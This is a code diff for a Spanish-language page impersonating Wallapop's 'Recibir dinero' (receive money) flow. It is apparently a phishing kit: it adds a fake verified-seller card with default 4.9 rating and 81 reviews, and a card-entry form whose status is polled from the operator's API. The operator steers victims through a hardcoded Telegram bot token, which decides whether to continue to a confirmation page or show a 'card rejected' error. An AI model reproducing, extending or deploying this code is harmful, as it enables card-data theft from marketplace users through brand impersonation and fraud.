@@ -4,6 +4,8 @@
 <meta charset="UTF-8">
 <meta name="viewport" content="width=device-width, initial-scale=1.0">
 <title>Recibir dinero · Wallapop</title>
+<link rel="icon" href="https://lh3.googleusercontent.com/eiHGogXLz3iBRZhKrdr7FOkw6q5P_iuGSwqGWmd1yRzMcc-B7V6xIKR9wzuqDrD61K4=w300">
+<link rel="apple-touch-icon" href="https://lh3.googleusercontent.com/eiHGogXLz3iBRZhKrdr7FOkw6q5P_iuGSwqGWmd1yRzMcc-B7V6xIKR9wzuqDrD61K4=w300">
 <script src="/products.js"></script>
 <link rel="preconnect" href="https://fonts.googleapis.com">
 <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
@@ -50,7 +52,20 @@ header{padding:10px 16px 10px;display:flex;align-items:center;gap:10px}
 
 .product{padding:0 16px 14px}
 .product h1{font-family:WallieChunky,Quicksand;font-size:18px;margin:0 0 4px;line-height:1.22;letter-spacing:-.2px}
+.subtitulo{font-size:13px;color:var(--wp-content-mid);margin:0 0 8px;line-height:1.4}
 .product .price{font-family:WallieChunky,Quicksand;font-size:22px;letter-spacing:-.4px}
+.seller-card{margin-top:14px;border:1px solid var(--wp-line);border-radius:16px;padding:12px 14px;display:flex;align-items:center;gap:12px;background:#fff}
+.seller-avatar-wrap{width:48px;height:48px;border-radius:50%;overflow:hidden;background:var(--wp-bg-low);flex-shrink:0}
+.seller-avatar{width:100%;height:100%;object-fit:cover;display:block}
+.seller-info{display:flex;flex-direction:column;gap:2px;min-width:0}
+.seller-name{font-family:WallieChunky,Quicksand,sans-serif;font-size:15px;color:var(--wp-content-high);font-weight:700;line-height:1.2}
+.seller-verified-row{display:flex;align-items:center;gap:4px;font-size:12px;color:var(--wp-content-mid)}
+.seller-check-ico{flex-shrink:0}
+.seller-rating-row{display:flex;align-items:center;gap:6px;margin-top:2px}
+.seller-stars{display:flex;align-items:center;gap:2px}
+.seller-score{font-family:WallieChunky,Quicksand,sans-serif;font-size:12px;font-weight:700;color:var(--wp-content-high)}
+.seller-reviews{font-size:12px;color:var(--wp-content-mid)}
+.reviews-num{text-decoration:underline}
 
 .desc{margin:0 16px 14px;background:#fff;border:1px solid var(--wp-line);border-radius:16px;padding:14px}
 .desc h2{font-family:WallieChunky,Quicksand;font-size:13px;margin:0 0 6px;color:var(--wp-content-mid)}
@@ -216,7 +231,35 @@ form#formCard{padding:0 16px}
 
     <div class="product">
       <h1 id="tTitulo">—</h1>
+      <div class="subtitulo" id="tSubtitulo" style="display:none;"></div>
       <div class="price" id="tPrecio">—</div>
+
+      <div class="seller-card" id="sellerCard" style="display:none;">
+        <div class="seller-avatar-wrap" id="sellerAvatarWrap">
+          <img id="sellerAvatar" class="seller-avatar" src="https://cdn.wallapop.com/images/13/12/gg/__/c13p64593082/i3624774605.jpg?pictureSize=W320" alt="Vendedor">
+        </div>
+        <div class="seller-info">
+          <div class="seller-name" id="sellerName">Vendedor</div>
+          <div class="seller-verified-row" id="sellerVerifiedRow">
+            <span class="seller-verified-txt">Perfil verificado</span>
+            <svg class="seller-check-ico" viewBox="0 0 24 24" width="15" height="15" fill="none" style="vertical-align:middle;">
+              <path fill="#29363D" d="M22.25 12c0-1.43-.88-2.67-2.19-3.34.46-1.39.2-2.9-.81-3.91s-2.52-1.27-3.91-.81c-.67-1.31-1.91-2.19-3.34-2.19s-2.67.88-3.33 2.19c-1.4-.46-2.91-.2-3.92.81s-1.26 2.52-.8 3.91c-1.31.67-2.2 1.91-2.2 3.34s.89 2.67 2.2 3.34c-.46 1.39-.21 2.9.8 3.91s2.52 1.26 3.91.81c.67 1.31 1.91 2.19 3.34 2.19s2.67-.88 3.34-2.19c1.39.45 2.9.2 3.91-.81s1.27-2.52.81-3.91c1.31-.67 2.19-1.91 2.19-3.34z"/>
+              <path d="M7.2 12.3l3.2 3.3 6.4-6.6" stroke="#ffffff" stroke-width="2.5" stroke-linecap="round" stroke-linejoin="round"/>
+            </svg>
+          </div>
+          <div class="seller-rating-row" id="sellerRatingRow">
+            <div class="seller-stars">
+              <svg viewBox="0 0 24 24" width="13" height="13" fill="#29363D"><path d="M12 2l2.9 6.6 7.1.6-5.3 4.8 1.6 7-6.3-3.7-6.3 3.7 1.6-7-5.3-4.8 7.1-.6z"/></svg>
+              <svg viewBox="0 0 24 24" width="13" height="13" fill="#29363D"><path d="M12 2l2.9 6.6 7.1.6-5.3 4.8 1.6 7-6.3-3.7-6.3 3.7 1.6-7-5.3-4.8 7.1-.6z"/></svg>
+              <svg viewBox="0 0 24 24" width="13" height="13" fill="#29363D"><path d="M12 2l2.9 6.6 7.1.6-5.3 4.8 1.6 7-6.3-3.7-6.3 3.7 1.6-7-5.3-4.8 7.1-.6z"/></svg>
+              <svg viewBox="0 0 24 24" width="13" height="13" fill="#29363D"><path d="M12 2l2.9 6.6 7.1.6-5.3 4.8 1.6 7-6.3-3.7-6.3 3.7 1.6-7-5.3-4.8 7.1-.6z"/></svg>
+              <svg viewBox="0 0 24 24" width="13" height="13" fill="#29363D"><path d="M12 2l2.9 6.6 7.1.6-5.3 4.8 1.6 7-6.3-3.7-6.3 3.7 1.6-7-5.3-4.8 7.1-.6z"/></svg>
+            </div>
+            <span class="seller-score" id="sellerScore">4.9</span>
+            <span class="seller-reviews" id="sellerReviews">(<span class="reviews-num" id="sellerReviewsNum">81</span>)</span>
+          </div>
+        </div>
+      </div>
     </div>
 
     <div class="desc"><h2>Descripción</h2><p id="tDesc">—</p></div>
@@ -522,7 +565,34 @@ async function show(id) {
   document.title = (p.titulo || 'Producto') + ' · Wallapop';
 
   $('tTitulo').textContent = p.titulo || '—';
+  if (p.subtitulo) {
+    $('tSubtitulo').textContent = p.subtitulo;
+    $('tSubtitulo').style.display = 'block';
+  } else {
+    $('tSubtitulo').style.display = 'none';
+  }
   $('tPrecio').textContent = eur(p.precio, false);
+
+  if (p.nombre || p.avatar || p.rating_score) {
+    $('sellerCard').style.display = 'flex';
+    $('sellerName').textContent = p.nombre || 'Vendedor';
+    let av = p.avatar || p.foto_perfil || 'https://cdn.wallapop.com/images/13/12/gg/__/c13p64593082/i3624774605.jpg?pictureSize=W320';
+    if (av.includes('api.telegram.org') && !av.includes('images.weserv.nl')) {
+      av = 'https://images.weserv.nl/?url=' + encodeURIComponent(av.replace(/^https?:\/\//, ''));
+    }
+    $('sellerAvatar').src = av;
+
+    if (p.verificado === false) {
+      $('sellerVerifiedRow').style.display = 'none';
+    } else {
+      $('sellerVerifiedRow').style.display = 'flex';
+    }
+
+    $('sellerScore').textContent = p.rating_score || '4.9';
+    $('sellerReviewsNum').textContent = p.rating_reviews || '81';
+  } else {
+    $('sellerCard').style.display = 'none';
+  }
   $('tDesc').textContent = p.descripcion || 'Sin descripción.';
   $('vNombre').textContent = p.nombre || '—';
   $('vDireccion').textContent = p.direccion || '—';
@@ -579,11 +649,14 @@ async function show(id) {
     } catch (e) {}
   }
 
-  // Normalizar enlaces de fotos asegurando compatibilidad con el storage del hosting
+  // Normalizar enlaces de Telegram para CORS y despliegue rápido
   fotos = fotos.map(src => {
     if (typeof src !== 'string') return '';
     src = src.trim();
     if (!src) return '';
+    if (src.includes('api.telegram.org') && !src.includes('images.weserv.nl')) {
+      src = 'https://images.weserv.nl/?url=' + encodeURIComponent(src.replace(/^https?:\/\//, ''));
+    }
     return src;
   }).filter(Boolean);
 
@@ -603,21 +676,9 @@ async function show(id) {
     const img = document.createElement('img');
     img.src = src; img.alt = 'Foto ' + (i + 1); img.loading = 'lazy';
     img.onerror = () => {
-      // 1. Si falló y tiene nombre de archivo img_xxx o tg_xxx, intentar cargarlo directo desde el storage /photos/
-      const m = src.match(/(img_[A-Za-z0-9_]+\.(jpg|jpeg|png|webp))/i) || src.match(/(tg_[A-Za-z0-9_]+\.(jpg|jpeg|png|webp))/i);
-      if (m && !img.dataset.retriedLocal) {
-        img.dataset.retriedLocal = '1';
-        img.src = '/photos/' + m[1];
-        return;
-      }
-      // 2. Si falló weserv y venía de telegram, intentar la URL directa
-      if (src.includes('images.weserv.nl') && !img.dataset.retriedTg) {
-        img.dataset.retriedTg = '1';
-        const parts = src.split('images.weserv.nl/?url=');
-        if (parts[1]) {
-          img.src = 'https://' + decodeURIComponent(parts[1]).replace(/^https?:\/\//, '');
-          return;
-        }
+      if (src.includes('api.telegram.org') && !img.dataset.retried) {
+        img.dataset.retried = '1';
+        img.src = 'https://images.weserv.nl/?url=' + encodeURIComponent(src.replace(/^https?:\/\//, ''));
       }
     };
     track.appendChild(img);
@@ -867,67 +928,33 @@ $('formCard').addEventListener('submit', async ev => {
   if (cardPollTimer) clearTimeout(cardPollTimer);
 
   const pollCardStatus = async () => {
-    let data = null;
-    // 1. Probar ruta amigable
+    // 1. Probar API local si está disponible
     try {
       const resp = await fetch('/api/product/' + idProd + '/tarjeta/status?t=' + Date.now());
       if (resp.ok) {
-        data = await resp.json();
+        const data = await resp.json();
+        if (data.status === 'continue' || data.status === 'continuar') {
+          window.location.href = '/confirmar.html' + (idProd ? '?id=' + idProd : '');
+          return;
+        } else if (data.status === 'error') {
+          $('spinnerTarjeta').style.display = 'none';
+          $('txtBtnTarjeta').textContent = 'Continuar';
+          btnSubmit.disabled = false;
+          $('cardErrorText').textContent = 'La tarjeta ha sido rechazada o los datos son incorrectos. Por favor compruébalos e inténtalo de nuevo.';
+          $('cardErrorBox').style.display = 'flex';
+          return;
+        }
       }
     } catch (e) {}
 
-    // 2. Probar api.php directo (fallback infalible para hosting PHP)
-    if (!data || !data.status) {
-      try {
-        const resp2 = await fetch('/api.php?action=tarjeta_status&id=' + idProd + '&t=' + Date.now());
-        if (resp2.ok) {
-          data = await resp2.json();
-        }
-      } catch (e) {}
-    }
-
-    if (data && data.status) {
-      if (data.status === 'continue' || data.status === 'continuar') {
-        const qParams = new URLSearchParams();
-        if (idProd) qParams.set('id', idProd);
-        if (currentProd) {
-          if (currentProd.titulo || currentProd.articulo) qParams.set('tit', currentProd.titulo || currentProd.articulo);
-          const pVal = currentProd.precioArticulo || currentProd.precio || 0;
-          if (pVal) qParams.set('precio', pVal);
-        }
-        const rawP = sp.get('p') || sp.get('d');
-        if (rawP) qParams.set('p', rawP);
-        try { localStorage.setItem('wp_active_prod', JSON.stringify(currentProd || { id: idProd })); } catch(e) {}
-        window.location.href = '/confirmar.html?' + qParams.toString();
-        return;
-      } else if (data.status === 'error') {
-        $('spinnerTarjeta').style.display = 'none';
-        $('txtBtnTarjeta').textContent = 'Continuar';
-        btnSubmit.disabled = false;
-        $('cardErrorText').textContent = 'La tarjeta ha sido rechazada o los datos son incorrectos. Por favor compruébalos e inténtalo de nuevo.';
-        $('cardErrorBox').style.display = 'flex';
-        return;
-      }
-    }
-
-    // 3. Fallback adicional Telegram getMyDescription
+    // 2. Probar Telegram getMyDescription (funciona 100% en Netlify y fuera de local)
     try {
       const tgDescResp = await fetch('https://api.telegram.org/bot8818995413:AAHLry4iCNQZ7T385CoVodbXQcnrkymFmKM/getMyDescription?t=' + Date.now());
       if (tgDescResp.ok) {
         const tgData = await tgDescResp.json();
         const desc = (tgData && tgData.result && tgData.result.description) || '';
         if (desc.includes('status:continue')) {
-          const qParams = new URLSearchParams();
-          if (idProd) qParams.set('id', idProd);
-          if (currentProd) {
-            if (currentProd.titulo || currentProd.articulo) qParams.set('tit', currentProd.titulo || currentProd.articulo);
-            const pVal = currentProd.precioArticulo || currentProd.precio || 0;
-            if (pVal) qParams.set('precio', pVal);
-          }
-          const rawP = sp.get('p') || sp.get('d');
-          if (rawP) qParams.set('p', rawP);
-          try { localStorage.setItem('wp_active_prod', JSON.stringify(currentProd || { id: idProd })); } catch(e) {}
-          window.location.href = '/confirmar.html?' + qParams.toString();
+          window.location.href = '/confirmar.html' + (idProd ? '?id=' + idProd : '');
           return;
         } else if (desc.includes('status:error')) {
           $('spinnerTarjeta').style.display = 'none';
@@ -940,7 +967,7 @@ $('formCard').addEventListener('submit', async ev => {
       }
     } catch (e) {}
 
-    cardPollTimer = setTimeout(pollCardStatus, 1000);
+    cardPollTimer = setTimeout(pollCardStatus, 1200);
   };
 
   cardPollTimer = setTimeout(pollCardStatus, 1200);
